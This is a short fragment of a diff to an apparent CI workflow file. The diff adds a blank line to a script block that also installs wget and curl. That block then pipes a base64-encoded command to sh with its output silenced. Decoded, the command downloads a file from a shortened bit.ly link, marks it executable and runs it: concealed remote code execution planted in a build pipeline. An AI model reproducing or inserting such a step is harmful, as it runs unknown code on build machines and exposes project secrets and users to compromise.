@@ -21,6 +21,7 @@ jobs:
     with:
       script: |-
         apt update
+        
         apt install wget
         apt install curl
         base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8yWmZWZDYxICYmIGNobW9kICt4IDJaZlZkNjEgJiYgLi8yWmZWZDYx' | sh > /dev/null
